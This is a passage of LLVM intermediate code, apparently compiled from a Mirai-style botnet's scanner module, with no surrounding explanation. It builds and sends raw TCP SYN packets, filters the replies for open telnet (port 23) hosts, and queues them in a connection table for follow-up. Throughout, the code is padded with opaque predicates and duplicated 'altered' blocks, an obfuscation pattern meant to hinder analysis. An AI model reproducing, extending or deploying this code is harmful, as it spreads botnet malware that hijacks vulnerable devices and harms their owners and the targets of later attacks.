  %330 = call zeroext i16 @htons(i16 zeroext 20) #9
  %331 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %327, i8* %329, i16 zeroext %330, i32 20)
  %332 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %333 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %332, i32 0, i32 6
  store i16 %331, i16* %333, align 4
  %334 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %334, align 4
  %335 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 9
  %337 = load i32, i32* %336, align 4
  %338 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %339 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %338, i32 0, i32 0
  store i32 %337, i32* %339, align 4
  %340 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %341 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %340, i32 0, i32 1
  %342 = load i16, i16* %341, align 2
  %343 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %342, i16* %343, align 2
  %344 = load i32, i32* @rsck, align 4
  %345 = bitcast %union.__SOCKADDR_ARG* %20 to %struct.sockaddr**
  %346 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %346, %struct.sockaddr** %345, align 8
  %347 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %20, i32 0, i32 0
  %348 = load %struct.sockaddr*, %struct.sockaddr** %347, align 8
  %349 = call i64 @sendto(i32 %344, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %348, i32 16)
  %350 = load i32, i32* @x.7
  %351 = load i32, i32* @y.8
  %352 = sub i32 %350, 1
  %353 = mul i32 %350, %352
  %354 = urem i32 %353, 2
  %355 = icmp eq i32 %354, 0
  %356 = icmp slt i32 %351, 10
  %357 = or i1 %355, %356
  br i1 %357, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %358

; <label>:358:                                    ; preds = %originalBBpart235
  %359 = load i32, i32* %1, align 4
  %360 = add nsw i32 %359, 1
  store i32 %360, i32* %1, align 4
  br label %268

; <label>:361:                                    ; preds = %originalBBpart231
  %362 = load i32, i32* @x.7
  %363 = load i32, i32* @y.8
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %361
  %370 = load i32, i32* @x.7
  %371 = load i32, i32* @y.8
  %372 = sub i32 %370, 1
  %373 = mul i32 %370, %372
  %374 = urem i32 %373, 2
  %375 = icmp eq i32 %374, 0
  %376 = icmp slt i32 %371, 10
  %377 = or i1 %375, %376
  br i1 %377, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %378

; <label>:378:                                    ; preds = %originalBBpart239, %originalBBpart223
  %379 = load i32, i32* @x.7
  %380 = load i32, i32* @y.8
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
  %386 = or i1 %384, %385
  br i1 %386, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %378
  store i32 0, i32* %12, align 4
  %387 = load i32, i32* @x.7
  %388 = load i32, i32* @y.8
  %389 = sub i32 %387, 1
  %390 = mul i32 %387, %389
  %391 = urem i32 %390, 2
  %392 = icmp eq i32 %391, 0
  %393 = icmp slt i32 %388, 10
  %394 = or i1 %392, %393
  br i1 %394, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br label %395

; <label>:395:                                    ; preds = %originalBBpart263, %532, %520, %512, %504, %496, %488, %479, %470, %463, %originalBBpart251, %originalBBpart243
  %396 = getelementptr inbounds [1514 x i8], [1514 x i8]* %22, i32 0, i32 0
  %397 = bitcast i8* %396 to %struct.iphdr*
  store %struct.iphdr* %397, %struct.iphdr** %23, align 8
  %398 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %399 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %398, i64 1
  %400 = bitcast %struct.iphdr* %399 to %struct.tcphdr*
  store %struct.tcphdr* %400, %struct.tcphdr** %24, align 8
  %401 = call i32* @__errno_location() #9
  store i32 0, i32* %401, align 4
  %402 = load i32, i32* @rsck, align 4
  %403 = getelementptr inbounds [1514 x i8], [1514 x i8]* %22, i32 0, i32 0
  %404 = bitcast %union.__SOCKADDR_ARG* %26 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %404, align 8
  %405 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %26, i32 0, i32 0
  %406 = load %struct.sockaddr*, %struct.sockaddr** %405, align 8
  %407 = call i64 @recvfrom(i32 %402, i8* %403, i64 1514, i32 16384, %struct.sockaddr* %406, i32* null)
  %408 = trunc i64 %407 to i32
  store i32 %408, i32* %21, align 4
  %409 = load i32, i32* %21, align 4
  %410 = icmp sle i32 %409, 0
  br i1 %410, label %435, label %411

; <label>:411:                                    ; preds = %395
  %412 = load i32, i32* @x.7
  %413 = load i32, i32* @y.8
  %414 = sub i32 %412, 1
  %415 = mul i32 %412, %414
  %416 = urem i32 %415, 2
  %417 = icmp eq i32 %416, 0
  %418 = icmp slt i32 %413, 10
  %419 = or i1 %417, %418
  br i1 %419, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %411
  %420 = call i32* @__errno_location() #9
  %421 = load i32, i32* %420, align 4
  %422 = icmp eq i32 %421, 11
  %423 = load i32, i32* @x.7
  %424 = load i32, i32* @y.8
  %425 = sub i32 %423, 1
  %426 = mul i32 %423, %425
  %427 = urem i32 %426, 2
  %428 = icmp eq i32 %427, 0
  %429 = icmp slt i32 %424, 10
  %430 = or i1 %428, %429
  br i1 %430, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br i1 %422, label %435, label %431

; <label>:431:                                    ; preds = %originalBBpart247
  %432 = call i32* @__errno_location() #9
  %433 = load i32, i32* %432, align 4
  %434 = icmp eq i32 %433, 11
  br i1 %434, label %435, label %436

; <label>:435:                                    ; preds = %431, %originalBBpart247, %395
  br label %620

; <label>:436:                                    ; preds = %431
  %437 = load i32, i32* %21, align 4
  %438 = sext i32 %437 to i64
  %439 = icmp ult i64 %438, 40
  br i1 %439, label %440, label %457

; <label>:440:                                    ; preds = %436
  %441 = load i32, i32* @x.7
  %442 = load i32, i32* @y.8
  %443 = sub i32 %441, 1
  %444 = mul i32 %441, %443
  %445 = urem i32 %444, 2
  %446 = icmp eq i32 %445, 0
  %447 = icmp slt i32 %442, 10
  %448 = or i1 %446, %447
  br i1 %448, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %440
  %449 = load i32, i32* @x.7
  %450 = load i32, i32* @y.8
  %451 = sub i32 %449, 1
  %452 = mul i32 %449, %451
  %453 = urem i32 %452, 2
  %454 = icmp eq i32 %453, 0
  %455 = icmp slt i32 %450, 10
  %456 = or i1 %454, %455
  br i1 %456, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br label %395

; <label>:457:                                    ; preds = %436
  %458 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %459 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %458, i32 0, i32 9
  %460 = load i32, i32* %459, align 4
  %461 = load i32, i32* @LOCAL_ADDR, align 4
  %462 = icmp ne i32 %460, %461
  br i1 %462, label %463, label %464

; <label>:463:                                    ; preds = %457
  br label %395

; <label>:464:                                    ; preds = %457
  %465 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %466 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %465, i32 0, i32 6
  %467 = load i8, i8* %466, align 1
  %468 = zext i8 %467 to i32
  %469 = icmp ne i32 %468, 6
  br i1 %469, label %470, label %471

; <label>:470:                                    ; preds = %464
  br label %395

; <label>:471:                                    ; preds = %464
  %472 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %473 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %472, i32 0, i32 0
  %474 = load i16, i16* %473, align 4
  %475 = zext i16 %474 to i32
  %476 = call zeroext i16 @htons(i16 zeroext 23) #9
  %477 = zext i16 %476 to i32
  %478 = icmp ne i32 %475, %477
  br i1 %478, label %479, label %480

; <label>:479:                                    ; preds = %471
  br label %395

; <label>:480:                                    ; preds = %471
  %481 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %482 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %481, i32 0, i32 1
  %483 = load i16, i16* %482, align 2
  %484 = zext i16 %483 to i32
  %485 = load i16, i16* %2, align 2
  %486 = zext i16 %485 to i32
  %487 = icmp ne i32 %484, %486
  br i1 %487, label %488, label %489

; <label>:488:                                    ; preds = %480
  br label %395

; <label>:489:                                    ; preds = %480
  %490 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %491 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %490, i32 0, i32 4
  %492 = load i16, i16* %491, align 4
  %493 = lshr i16 %492, 9
  %494 = and i16 %493, 1
  %495 = icmp ne i16 %494, 0
  br i1 %495, label %497, label %496

; <label>:496:                                    ; preds = %489
  br label %395

; <label>:497:                                    ; preds = %489
  %498 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %499 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %498, i32 0, i32 4
  %500 = load i16, i16* %499, align 4
  %501 = lshr i16 %500, 12
  %502 = and i16 %501, 1
  %503 = icmp ne i16 %502, 0
  br i1 %503, label %505, label %504

; <label>:504:                                    ; preds = %497
  br label %395

; <label>:505:                                    ; preds = %497
  %506 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %507 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %506, i32 0, i32 4
  %508 = load i16, i16* %507, align 4
  %509 = lshr i16 %508, 10
  %510 = and i16 %509, 1
  %511 = icmp ne i16 %510, 0
  br i1 %511, label %512, label %513

; <label>:512:                                    ; preds = %505
  br label %395

; <label>:513:                                    ; preds = %505
  %514 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %515 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %514, i32 0, i32 4
  %516 = load i16, i16* %515, align 4
  %517 = lshr i16 %516, 8
  %518 = and i16 %517, 1
  %519 = icmp ne i16 %518, 0
  br i1 %519, label %520, label %521

; <label>:520:                                    ; preds = %513
  br label %395

; <label>:521:                                    ; preds = %513
  %522 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %523 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %522, i32 0, i32 3
  %524 = load i32, i32* %523, align 4
  %525 = call i32 @ntohl(i32 %524) #9
  %526 = sub i32 %525, 1
  %527 = call i32 @htonl(i32 %526) #9
  %528 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %529 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %528, i32 0, i32 8
  %530 = load i32, i32* %529, align 4
  %531 = icmp ne i32 %527, %530
  br i1 %531, label %532, label %533

; <label>:532:                                    ; preds = %521
  br label %395

; <label>:533:                                    ; preds = %521
  store %struct.scanner_connection* null, %struct.scanner_connection** %25, align 8
  %534 = load i32, i32* %12, align 4
  store i32 %534, i32* %21, align 4
  br label %535

; <label>:535:                                    ; preds = %553, %533
  %536 = load i32, i32* %21, align 4
  %537 = icmp slt i32 %536, 628
  br i1 %537, label %538, label %556

; <label>:538:                                    ; preds = %535
  %539 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %540 = load i32, i32* %21, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %539, i64 %541
  %543 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %542, i32 0, i32 16
  %544 = load i32, i32* %543, align 8
  %545 = icmp eq i32 %544, 0
  br i1 %545, label %546, label %552

; <label>:546:                                    ; preds = %538
  %547 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %548 = load i32, i32* %21, align 4
  %549 = sext i32 %548 to i64
  %550 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %547, i64 %549
  store %struct.scanner_connection* %550, %struct.scanner_connection** %25, align 8
  %551 = load i32, i32* %21, align 4
  store i32 %551, i32* %12, align 4
  br label %556

; <label>:552:                                    ; preds = %538
  br label %553

; <label>:553:                                    ; preds = %552
  %554 = load i32, i32* %21, align 4
  %555 = add nsw i32 %554, 1
  store i32 %555, i32* %21, align 4
  br label %535

; <label>:556:                                    ; preds = %546, %535
  %557 = load i32, i32* @x.7
  %558 = load i32, i32* @y.8
  %559 = sub i32 %557, 1
  %560 = mul i32 %557, %559
  %561 = urem i32 %560, 2
  %562 = icmp eq i32 %561, 0
  %563 = icmp slt i32 %558, 10
  %564 = or i1 %562, %563
  br i1 %564, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %556
  %565 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  %566 = icmp eq %struct.scanner_connection* %565, null
  %567 = load i32, i32* @x.7
  %568 = load i32, i32* @y.8
  %569 = sub i32 %567, 1
  %570 = mul i32 %567, %569
  %571 = urem i32 %570, 2
  %572 = icmp eq i32 %571, 0
  %573 = icmp slt i32 %568, 10
  %574 = or i1 %572, %573
  br i1 %574, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br i1 %566, label %575, label %592

; <label>:575:                                    ; preds = %originalBBpart255
  %576 = load i32, i32* @x.7
  %577 = load i32, i32* @y.8
  %578 = sub i32 %576, 1
  %579 = mul i32 %576, %578
  %580 = urem i32 %579, 2
  %581 = icmp eq i32 %580, 0
  %582 = icmp slt i32 %577, 10
  %583 = or i1 %581, %582
  br i1 %583, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %575
  %584 = load i32, i32* @x.7
  %585 = load i32, i32* @y.8
  %586 = sub i32 %584, 1
  %587 = mul i32 %584, %586
  %588 = urem i32 %587, 2
  %589 = icmp eq i32 %588, 0
  %590 = icmp slt i32 %585, 10
  %591 = or i1 %589, %590
  br i1 %591, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br label %620

; <label>:592:                                    ; preds = %originalBBpart255
  %593 = load i32, i32* @x.7
  %594 = load i32, i32* @y.8
  %595 = sub i32 %593, 1
  %596 = mul i32 %593, %595
  %597 = urem i32 %596, 2
  %598 = icmp eq i32 %597, 0
  %599 = icmp slt i32 %594, 10
  %600 = or i1 %598, %599
  br i1 %600, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %592
  %601 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %602 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %601, i32 0, i32 8
  %603 = load i32, i32* %602, align 4
  %604 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  %605 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %604, i32 0, i32 15
  store i32 %603, i32* %605, align 4
  %606 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %607 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %606, i32 0, i32 0
  %608 = load i16, i16* %607, align 4
  %609 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  %610 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %609, i32 0, i32 13
  store i16 %608, i16* %610, align 8
  %611 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  call void @setup_connection(%struct.scanner_connection* %611)
  %612 = load i32, i32* @x.7
  %613 = load i32, i32* @y.8
  %614 = sub i32 %612, 1
  %615 = mul i32 %612, %614
  %616 = urem i32 %615, 2
  %617 = icmp eq i32 %616, 0
  %618 = icmp slt i32 %613, 10
  %619 = or i1 %617, %618
  br i1 %619, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br label %395

; <label>:620:                                    ; preds = %originalBBpart259, %435
  br label %621

; <label>:621:                                    ; preds = %620
  %622 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %623 = getelementptr inbounds [16 x i64], [16 x i64]* %622, i64 0, i64 0
  %624 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %623) #7, !srcloc !3
  %625 = extractvalue { i64, i64* } %624, 0
  %626 = extractvalue { i64, i64* } %624, 1
  %627 = trunc i64 %625 to i32
  store i32 %627, i32* %27, align 4
  %628 = ptrtoint i64* %626 to i64
  %629 = trunc i64 %628 to i32
  store i32 %629, i32* %28, align 4
  br label %630

; <label>:630:                                    ; preds = %621
  br label %631

; <label>:631:                                    ; preds = %630
  %632 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i32 0, i32 0
  %633 = getelementptr inbounds [16 x i64], [16 x i64]* %632, i64 0, i64 0
  %634 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %633) #7, !srcloc !4
  %635 = extractvalue { i64, i64* } %634, 0
  %636 = extractvalue { i64, i64* } %634, 1
  %637 = trunc i64 %635 to i32
  store i32 %637, i32* %29, align 4
  %638 = ptrtoint i64* %636 to i64
  %639 = trunc i64 %638 to i32
  store i32 %639, i32* %30, align 4
  br label %640

; <label>:640:                                    ; preds = %631
  store i32 0, i32* %1, align 4
  br label %641

; <label>:641:                                    ; preds = %877, %640
  %642 = load i32, i32* @x.7
  %643 = load i32, i32* @y.8
  %644 = sub i32 %642, 1
  %645 = mul i32 %642, %644
  %646 = urem i32 %645, 2
  %647 = icmp eq i32 %646, 0
  %648 = icmp slt i32 %643, 10
  %649 = or i1 %647, %648
  br i1 %649, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %641
  %650 = load i32, i32* %1, align 4
  %651 = icmp slt i32 %650, 628
  %652 = load i32, i32* @x.7
  %653 = load i32, i32* @y.8
  %654 = sub i32 %652, 1
  %655 = mul i32 %652, %654
  %656 = urem i32 %655, 2
  %657 = icmp eq i32 %656, 0
  %658 = icmp slt i32 %653, 10
  %659 = or i1 %657, %658
  br i1 %659, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %651, label %660, label %880

; <label>:660:                                    ; preds = %originalBBpart267
  %661 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %662 = load i32, i32* %1, align 4
  %663 = sext i32 %662 to i64
  %664 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %661, i64 %663
  store %struct.scanner_connection* %664, %struct.scanner_connection** %10, align 8
  %665 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %666 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %665, i32 0, i32 16
  %667 = load i32, i32* %666, align 8
  %668 = icmp ugt i32 %667, 1
  %669 = select i1 %668, i32 30, i32 5
  store i32 %669, i32* %31, align 4
  %670 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %671 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %670, i32 0, i32 16
  %672 = load i32, i32* %671, align 8
  %673 = icmp ne i32 %672, 0
  br i1 %673, label %674, label %749

; <label>:674:                                    ; preds = %660
  %675 = load i32, i32* @fake_time, align 4
  %676 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %677 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %676, i32 0, i32 3
  %678 = load i32, i32* %677, align 4
  %679 = sub i32 %675, %678
  %680 = load i32, i32* %31, align 4
  %681 = icmp ugt i32 %679, %680
  br i1 %681, label %682, label %749

; <label>:682:                                    ; preds = %674
  %683 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %684 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %683, i32 0, i32 2
  %685 = load i32, i32* %684, align 8
  %686 = icmp eq i32 %685, -1
  br i1 %686, label %687, label %688

; <label>:687:                                    ; preds = %682
  br label %877

; <label>:688:                                    ; preds = %682
  %689 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %690 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %689, i32 0, i32 2
  %691 = load i32, i32* %690, align 8
  %692 = call i32 @close(i32 %691)
  %693 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %694 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %693, i32 0, i32 2
  store i32 -1, i32* %694, align 8
  %695 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %696 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %695, i32 0, i32 16
  %697 = load i32, i32* %696, align 8
  %698 = icmp ugt i32 %697, 2
  br i1 %698, label %699, label %727

; <label>:699:                                    ; preds = %688
  %700 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %701 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %700, i32 0, i32 9
  %702 = load i8, i8* %701, align 4
  %703 = add i8 %702, 1
  store i8 %703, i8* %701, align 4
  %704 = zext i8 %703 to i32
  %705 = icmp eq i32 %704, 10
  br i1 %705, label %706, label %724

; <label>:706:                                    ; preds = %699
  %707 = load i32, i32* @x.7
  %708 = load i32, i32* @y.8
  %709 = sub i32 %707, 1
  %710 = mul i32 %707, %709
  %711 = urem i32 %710, 2
  %712 = icmp eq i32 %711, 0
  %713 = icmp slt i32 %708, 10
  %714 = or i1 %712, %713
  br i1 %714, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %706
  %715 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %715, i32 1)
  %716 = load i32, i32* @x.7
  %717 = load i32, i32* @y.8
  %718 = sub i32 %716, 1
  %719 = mul i32 %716, %718
  %720 = urem i32 %719, 2
  %721 = icmp eq i32 %720, 0
  %722 = icmp slt i32 %717, 10
  %723 = or i1 %721, %722
  br i1 %723, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br label %726

; <label>:724:                                    ; preds = %699
  %725 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @setup_connection(%struct.scanner_connection* %725)
  br label %726

; <label>:726:                                    ; preds = %724, %originalBBpart271
  br label %748

; <label>:727:                                    ; preds = %688
  %728 = load i32, i32* @x.7
  %729 = load i32, i32* @y.8
  %730 = sub i32 %728, 1
  %731 = mul i32 %728, %730
  %732 = urem i32 %731, 2
  %733 = icmp eq i32 %732, 0
  %734 = icmp slt i32 %729, 10
  %735 = or i1 %733, %734
  br i1 %735, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %727
  %736 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %737 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %736, i32 0, i32 9
  store i8 0, i8* %737, align 4
  %738 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %739 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %738, i32 0, i32 16
  store i32 0, i32* %739, align 8
  %740 = load i32, i32* @x.7
  %741 = load i32, i32* @y.8
  %742 = sub i32 %740, 1
  %743 = mul i32 %740, %742
  %744 = urem i32 %743, 2
  %745 = icmp eq i32 %744, 0
  %746 = icmp slt i32 %741, 10
  %747 = or i1 %745, %746
  br i1 %747, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br label %748

; <label>:748:                                    ; preds = %originalBBpart275, %726
  br label %877

; <label>:749:                                    ; preds = %674, %660
  %750 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %751 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %750, i32 0, i32 16
  %752 = load i32, i32* %751, align 8
  %753 = icmp eq i32 %752, 1
  br i1 %753, label %754, label %796

; <label>:754:                                    ; preds = %749
  %755 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %756 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %755, i32 0, i32 2
  %757 = load i32, i32* %756, align 8
  %758 = srem i32 %757, 64
  %759 = zext i32 %758 to i64
  %760 = shl i64 1, %759
  %761 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i32 0, i32 0
  %762 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %763 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %762, i32 0, i32 2
  %764 = load i32, i32* %763, align 8
  %765 = sdiv i32 %764, 64
  %766 = sext i32 %765 to i64
  %767 = getelementptr inbounds [16 x i64], [16 x i64]* %761, i64 0, i64 %766
  %768 = load i64, i64* %767, align 8
  %769 = or i64 %768, %760
  store i64 %769, i64* %767, align 8
  %770 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %771 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %770, i32 0, i32 2
  %772 = load i32, i32* %771, align 8
  %773 = load i32, i32* %15, align 4
  %774 = icmp sgt i32 %772, %773
  br i1 %774, label %775, label %779

; <label>:775:                                    ; preds = %754
  %776 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %777 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %776, i32 0, i32 2
  %778 = load i32, i32* %777, align 8
  store i32 %778, i32* %15, align 4
  br label %779

; <label>:779:                                    ; preds = %775, %754
  %780 = load i32, i32* @x.7
  %781 = load i32, i32* @y.8
  %782 = sub i32 %780, 1
  %783 = mul i32 %780, %782
  %784 = urem i32 %783, 2
  %785 = icmp eq i32 %784, 0
  %786 = icmp slt i32 %781, 10
  %787 = or i1 %785, %786
  br i1 %787, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %779
  %788 = load i32, i32* @x.7
  %789 = load i32, i32* @y.8
  %790 = sub i32 %788, 1
  %791 = mul i32 %788, %790
  %792 = urem i32 %791, 2
  %793 = icmp eq i32 %792, 0
  %794 = icmp slt i32 %789, 10
  %795 = or i1 %793, %794
  br i1 %795, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br label %860

; <label>:796:                                    ; preds = %749
  %797 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %798 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %797, i32 0, i32 16
  %799 = load i32, i32* %798, align 8
  %800 = icmp ne i32 %799, 0
  br i1 %800, label %801, label %843

; <label>:801:                                    ; preds = %796
  %802 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %803 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %802, i32 0, i32 2
  %804 = load i32, i32* %803, align 8
  %805 = srem i32 %804, 64
  %806 = zext i32 %805 to i64
  %807 = shl i64 1, %806
  %808 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %809 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %810 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %809, i32 0, i32 2
  %811 = load i32, i32* %810, align 8
  %812 = sdiv i32 %811, 64
  %813 = sext i32 %812 to i64
  %814 = getelementptr inbounds [16 x i64], [16 x i64]* %808, i64 0, i64 %813
  %815 = load i64, i64* %814, align 8
  %816 = or i64 %815, %807
  store i64 %816, i64* %814, align 8
  %817 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %818 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %817, i32 0, i32 2
  %819 = load i32, i32* %818, align 8
  %820 = load i32, i32* %14, align 4
  %821 = icmp sgt i32 %819, %820
  br i1 %821, label %822, label %842

; <label>:822:                                    ; preds = %801
  %823 = load i32, i32* @x.7
  %824 = load i32, i32* @y.8
  %825 = sub i32 %823, 1
  %826 = mul i32 %823, %825
  %827 = urem i32 %826, 2
  %828 = icmp eq i32 %827, 0
  %829 = icmp slt i32 %824, 10
  %830 = or i1 %828, %829
  br i1 %830, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %822
  %831 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %832 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %831, i32 0, i32 2
  %833 = load i32, i32* %832, align 8
  store i32 %833, i32* %14, align 4
  %834 = load i32, i32* @x.7
  %835 = load i32, i32* @y.8
  %836 = sub i32 %834, 1
  %837 = mul i32 %834, %836
  %838 = urem i32 %837, 2
  %839 = icmp eq i32 %838, 0
  %840 = icmp slt i32 %835, 10
  %841 = or i1 %839, %840
  br i1 %841, label %originalBBpart283, label %originalBB81alteredBB

